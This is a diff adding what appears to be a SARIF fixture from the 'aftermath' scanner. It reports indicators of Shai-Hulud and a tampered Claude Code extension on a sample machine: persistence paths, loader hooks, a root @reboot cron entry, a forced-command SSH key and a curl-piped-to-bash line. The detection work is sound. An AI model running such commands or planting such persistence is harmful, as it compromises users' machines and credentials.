@@ -1,0 +1,722 @@
+{
+  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/main/sarif-2.1.0/schema/sarif-schema-2.1.0.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "aftermath",
+          "version": "0.1.0",
+          "informationUri": "https://github.com/ucsurf/aftermath",
+          "rules": [
+            {
+              "id": "shai-hulud-execution-js",
+              "name": "shai-hulud-execution-js",
+              "shortDescription": {
+                "text": "Shai-Hulud payload path .claude/execution.js"
+              },
+              "fullDescription": {
+                "text": "StepSecurity lists .claude/execution.js as the payload copy committed into repositories. A file you created at this path also matches."
+              },
+              "helpUri": "https://www.stepsecurity.io/blog/a-mini-shai-hulud-has-appeared",
+              "defaultConfiguration": {
+                "level": "error"
+              }
+            },
+            {
+              "id": "shai-hulud-router-runtime",
+              "name": "shai-hulud-router-runtime",
+              "shortDescription": {
+                "text": "Shai-Hulud payload path .claude/router_runtime.js"
+              },
+              "fullDescription": {
+                "text": "Microsoft's Shai-Hulud 2.0 note lists .claude/router_runtime.js as a payload copy written next to the Claude SessionStart hook."
+              },
+              "helpUri": "https://www.microsoft.com/en-us/security/blog/2025/12/09/shai-hulud-2-0-guidance-for-detecting-investigating-and-defending-against-the-supply-chain-attack/",
+              "defaultConfiguration": {
+                "level": "error"
+              }
+            },
+            {
+              "id": "shai-hulud-claude-hook",
+              "name": "shai-hulud-claude-hook",
+              "shortDescription": {
+                "text": "Claude settings SessionStart hook runs node .vscode/setup.mjs"
+              },
+              "fullDescription": {
+                "text": "The same StepSecurity writeup describes .claude/settings.json with a SessionStart hook whose command is node .vscode/setup.mjs."
+              },
+              "helpUri": "https://www.stepsecurity.io/blog/a-mini-shai-hulud-has-appeared",
+              "defaultConfiguration": {
+                "level": "error"
+              }
+            },
+            {
+              "id": "shai-hulud-setup-mjs",
+              "name": "shai-hulud-setup-mjs",
+              "shortDescription": {
+                "text": "Shai-Hulud loader path setup.mjs under .claude or .vscode"
+              },
+              "fullDescription": {
+                "text": "StepSecurity and Microsoft describe setup.mjs written to .claude and .vscode as the loader those IDE hooks execute."
+              },
+              "helpUri": "https://www.stepsecurity.io/blog/a-mini-shai-hulud-has-appeared",
+              "defaultConfiguration": {
+                "level": "error"
+              }
+            },
+            {
+              "id": "cursor-claude-ext-smt-files",
+              "name": "cursor-claude-ext-smt-files",
+              "shortDescription": {
+                "text": "Persistence file from the tampered Claude Code extension"
+              },
+              "fullDescription": {
+                "text": "The same notice lists ~/.config/.smt and ~/.config/.smtk on Linux and macOS, and %USERPROFILE%\\.config\\smt.cmd and smtk on Windows. File contents are not read or displayed."
+              },
+              "helpUri": "https://cursor.com/blog/claude-code-extension-security-notice",
+              "defaultConfiguration": {
+                "level": "error"
+              }
+            },
+            {
+              "id": "cursor-claude-ext-ssh-key",
+              "name": "cursor-claude-ext-ssh-key",
+              "shortDescription": {
+                "text": "SSH authorized_keys matches the tampered Claude Code extension"
+              },
+              "fullDescription": {
+                "text": "Cursor reported that marketplace copies of Anthropic.claude-code 2.1.312 and 2.1.313 appended an ssh-ed25519 key whose comment is svc-telemetry. The key material below is the public key from that notice."
+              },
+              "helpUri": "https://cursor.com/blog/claude-code-extension-security-notice",
+              "defaultConfiguration": {
+                "level": "error"
+              }
+            },
+            {
+              "id": "shai-hulud-vscode-task",
+              "name": "shai-hulud-vscode-task",
+              "shortDescription": {
+                "text": "VS Code task runs node .claude/setup.mjs"
+              },
+              "fullDescription": {
+                "text": "StepSecurity described a Shai-Hulud wave that commits .vscode/tasks.json with a folderOpen task whose command is node .claude/setup.mjs."
+              },
+              "helpUri": "https://www.stepsecurity.io/blog/a-mini-shai-hulud-has-appeared",
+              "defaultConfiguration": {
+                "level": "error"
+              }
+            },
+            {
+              "id": "cursor-claude-ext-startup-sysmon",
+              "name": "cursor-claude-ext-startup-sysmon",
+              "shortDescription": {
+                "text": "Startup script sysmon.cmd from the tampered Claude Code extension"
+              },
+              "fullDescription": {
+                "text": "The notice names the Windows fallback %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sysmon.cmd."
+              },
+              "helpUri": "https://cursor.com/blog/claude-code-extension-security-notice",
+              "defaultConfiguration": {
+                "level": "error"
+              }
+            },
+            {
+              "id": "cursor-claude-ext-launchagent",
+              "name": "cursor-claude-ext-launchagent",
+              "shortDescription": {
+                "text": "LaunchAgent com.apple.sysmond.plist from the tampered Claude Code extension"
+              },
+              "fullDescription": {
+                "text": "The notice names ~/Library/LaunchAgents/com.apple.sysmond.plist (label com.apple.sysmond) as the macOS persistence plist."
+              },
+              "helpUri": "https://cursor.com/blog/claude-code-extension-security-notice",
+              "defaultConfiguration": {
+                "level": "error"
+              }
+            },
+            {
+              "id": "cursor-claude-ext-task-sysmon",
+              "name": "cursor-claude-ext-task-sysmon",
+              "shortDescription": {
+                "text": "Scheduled task SysMon from the tampered Claude Code extension"
+              },
+              "fullDescription": {
+                "text": "The notice names a scheduled task SysMon. This matches the task file at Windows\\System32\\Tasks\\SysMon. A legitimate task with the same name would also match."
+              },
+              "helpUri": "https://cursor.com/blog/claude-code-extension-security-notice",
+              "defaultConfiguration": {
+                "level": "error"
+              }
+            },
+            {
+              "id": "cursor-claude-ext-cron-smt",
+              "name": "cursor-claude-ext-cron-smt",
+              "shortDescription": {
+                "text": "Crontab command references .config/.smt"
+              },
+              "fullDescription": {
+                "text": "The notice describes a Linux @reboot crontab entry that runs .config/.smt. The matched text is the published path fragment, not a copy of the script."
+              },
+              "helpUri": "https://cursor.com/blog/claude-code-extension-security-notice",
+              "defaultConfiguration": {
+                "level": "error"
+              }
+            },
+            {
+              "id": "cursor-claude-ext-stk-temp",
+              "name": "cursor-claude-ext-stk-temp",
+              "shortDescription": {
+                "text": "Temp file name .stk_ plus 10 hex characters"
+              },
+              "fullDescription": {
+                "text": "The notice names /tmp/.stk_\u003c10 hex\u003e, $TMPDIR/.stk_\u003c10 hex\u003e, and %TEMP%\\.stk_\u003c10 hex\u003e as SSH identity files. Contents are not read."
+              },
+              "helpUri": "https://cursor.com/blog/claude-code-extension-security-notice",
+              "defaultConfiguration": {
+                "level": "error"
+              }
+            },
+            {
+              "id": "git.hooksPath",
+              "name": "git.hooksPath",
+              "shortDescription": {
+                "text": "core.hooksPath is set"
+              },
+              "fullDescription": {
+                "text": "Git runs hooks from this directory on every repository command that uses hooks."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              }
+            },
+            {
+              "id": "shell.suspicious",
+              "name": "shell.suspicious",
+              "shortDescription": {
+                "text": "download or decode piped to a shell"
+              },
+              "fullDescription": {
+                "text": "Matched a shell startup line. Common toolchain PATH prefixes are not reported."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              }
+            },
+            {
+              "id": "ssh.command",
+              "name": "ssh.command",
+              "shortDescription": {
+                "text": "SSH authorized key forces a command"
+              },
+              "fullDescription": {
+                "text": "Public key material is not included. The fingerprint is SHA256 of the key blob."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              }
+            },
+            {
+              "id": "ide.hook",
+              "name": "ide.hook",
+              "shortDescription": {
+                "text": "claude hook command"
+              },
+              "fullDescription": {
+                "text": "The command was not executed."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              }
+            },
+            {
+              "id": "ide.task",
+              "name": "ide.task",
+              "shortDescription": {
+                "text": "vscode task runs on folder open"
+              },
+              "fullDescription": {
+                "text": "The command was not executed."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              }
+            },
+            {
+              "id": "pkg.token",
+              "name": "pkg.token",
+              "shortDescription": {
+                "text": "npm auth token is present"
+              },
+              "fullDescription": {
+                "text": "Tokens on a machine involved in an incident should be rotated."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              }
+            },
+            {
+              "id": "git.insteadOf",
+              "name": "git.insteadOf",
+              "shortDescription": {
+                "text": "git URL rewrite to a known host"
+              },
+              "fullDescription": {
+                "text": "Git rewrites URLs that start with the insteadOf prefix so they start with the section URL."
+              },
+              "defaultConfiguration": {
+                "level": "note"
+              }
+            },
+            {
+              "id": "autorun.cron",
+              "name": "autorun.cron",
+              "shortDescription": {
+                "text": "system crontab entry"
+              },
+              "fullDescription": {
+                "text": "The entry was not started."
+              },
+              "defaultConfiguration": {
+                "level": "note"
+              }
+            },
+            {
+              "id": "git.credential",
+              "name": "git.credential",
+              "shortDescription": {
+                "text": "credential helper"
+              },
+              "fullDescription": {
+                "text": "credential helper"
+              },
+              "defaultConfiguration": {
+                "level": "note"
+              }
+            },
+            {
+              "id": "ssh.key",
+              "name": "ssh.key",
+              "shortDescription": {
+                "text": "SSH authorized key"
+              },
+              "fullDescription": {
+                "text": "Public key material is not included. The fingerprint is SHA256 of the key blob."
+              },
+              "defaultConfiguration": {
+                "level": "note"
+              }
+            }
+          ]
+        }
+      },
+      "results": [
+        {
+          "ruleId": "shai-hulud-execution-js",
+          "level": "error",
+          "message": {
+            "text": "Shai-Hulud payload path .claude/execution.js: path exists; contents not displayed"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file:///home/dev/.claude/execution.js"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "shai-hulud-router-runtime",
+          "level": "error",
+          "message": {
+            "text": "Shai-Hulud payload path .claude/router_runtime.js: path exists; contents not displayed"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file:///home/dev/.claude/router_runtime.js"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "shai-hulud-claude-hook",
+          "level": "error",
+          "message": {
+            "text": "Claude settings SessionStart hook runs node .vscode/setup.mjs: matched \"node .vscode/setup.mjs\""
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file:///home/dev/.claude/settings.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "shai-hulud-setup-mjs",
+          "level": "error",
+          "message": {
+            "text": "Shai-Hulud loader path setup.mjs under .claude or .vscode: path exists; contents not displayed"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file:///home/dev/.claude/setup.mjs"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "cursor-claude-ext-smt-files",
+          "level": "error",
+          "message": {
+            "text": "Persistence file from the tampered Claude Code extension: path exists; contents not displayed"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file:///home/dev/.config/.smt"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "cursor-claude-ext-smt-files",
+          "level": "error",
+          "message": {
+            "text": "Persistence file from the tampered Claude Code extension: path exists; contents not displayed"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file:///home/dev/.config/.smtk"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "cursor-claude-ext-ssh-key",
+          "level": "error",
+          "message": {
+            "text": "SSH authorized_keys matches the tampered Claude Code extension: matched published indicator material"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file:///home/dev/.ssh/authorized_keys"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "shai-hulud-setup-mjs",
+          "level": "error",
+          "message": {
+            "text": "Shai-Hulud loader path setup.mjs under .claude or .vscode: path exists; contents not displayed"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file:///home/dev/.vscode/setup.mjs"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "shai-hulud-vscode-task",
+          "level": "error",
+          "message": {
+            "text": "VS Code task runs node .claude/setup.mjs: matched \"node .claude/setup.mjs\""
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file:///home/dev/.vscode/tasks.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "cursor-claude-ext-startup-sysmon",
+          "level": "error",
+          "message": {
+            "text": "Startup script sysmon.cmd from the tampered Claude Code extension: path exists; contents not displayed"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file:///home/dev/AppData/Roaming/Microsoft/Windows/Start%20Menu/Programs/Startup/sysmon.cmd"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "cursor-claude-ext-launchagent",
+          "level": "error",
+          "message": {
+            "text": "LaunchAgent com.apple.sysmond.plist from the tampered Claude Code extension: path exists; contents not displayed"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file:///home/dev/Library/LaunchAgents/com.apple.sysmond.plist"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "cursor-claude-ext-task-sysmon",
+          "level": "error",
+          "message": {
+            "text": "Scheduled task SysMon from the tampered Claude Code extension: path exists; contents not displayed"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file:///system/Windows/System32/Tasks/SysMon"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "cursor-claude-ext-cron-smt",
+          "level": "error",
+          "message": {
+            "text": "Crontab command references .config/.smt: matched \".config/.smt\""
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file:///system/etc/crontab"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "cursor-claude-ext-stk-temp",
+          "level": "error",
+          "message": {
+            "text": "Temp file name .stk_ plus 10 hex characters: temp file name matched; contents not read"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file:///temp/.stk_0123abcdef"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "git.hooksPath",
+          "level": "error",
+          "message": {
+            "text": "core.hooksPath is set: core.hooksPath=.git-hooks"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file:///home/dev/.gitconfig"
+                },
+                "region": {
+                  "startLine": 4
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "shell.suspicious",
+          "level": "error",
+          "message": {
+            "text": "download or decode piped to a shell: curl -fsSL https://example.invalid/setup.sh | bash"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file:///home/dev/.bashrc"
+                },
+                "region": {
+                  "startLine": 4
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "ssh.command",
+          "level": "error",
+          "message": {
+            "text": "SSH authorized key forces a command: ssh-ed25519 SHA256:0Z6R+DF64Do2nwQic8a7kkfDLNNk4IiK+2U2Rci4htk comment=svc-telemetry options=command=\"echo aftermath-fixture\",restrict"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file:///home/dev/.ssh/authorized_keys"
+                },
+                "region": {
+                  "startLine": 2
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "ide.hook",
+          "level": "warning",
+          "message": {
+            "text": "claude hook command: node .vscode/setup.mjs"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file:///home/dev/.claude/settings.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "ide.task",
+          "level": "warning",
+          "message": {
+            "text": "vscode task runs on folder open: Environment Setup: node .claude/setup.mjs"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file:///home/dev/.vscode/tasks.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "pkg.token",
+          "level": "warning",
+          "message": {
+            "text": "npm auth token is present: key=_authToken host=registry.npmjs.org; rotate if this machine was involved in an incident"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file:///home/dev/.npmrc"
+                },
+                "region": {
+                  "startLine": 2
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "git.insteadOf",
+          "level": "note",
+          "message": {
+            "text": "git URL rewrite to a known host: base=git@github.com: insteadOf=https://github.com/"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file:///home/dev/.gitconfig"
+                },
+                "region": {
+                  "startLine": 6
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "autorun.cron",
+          "level": "note",
+          "message": {
+            "text": "system crontab entry: @reboot user=root /bin/sh \"$HOME/.config/.smt\""
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file:///system/etc/crontab"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "git.credential",
+          "level": "note",
+          "message": {
+            "text": "credential helper: credential.helper=osxkeychain"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file:///home/dev/.gitconfig"
+                },
+                "region": {
+                  "startLine": 2
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "ssh.key",
+          "level": "note",
+          "message": {
+            "text": "SSH authorized key: ssh-ed25519 SHA256:cJ6AyISHokEeHuTfufIqhhSS0gxHZRUMDHlKvXD4FHw comment=dev-laptop options=none"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "file:///home/dev/.ssh/authorized_keys"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
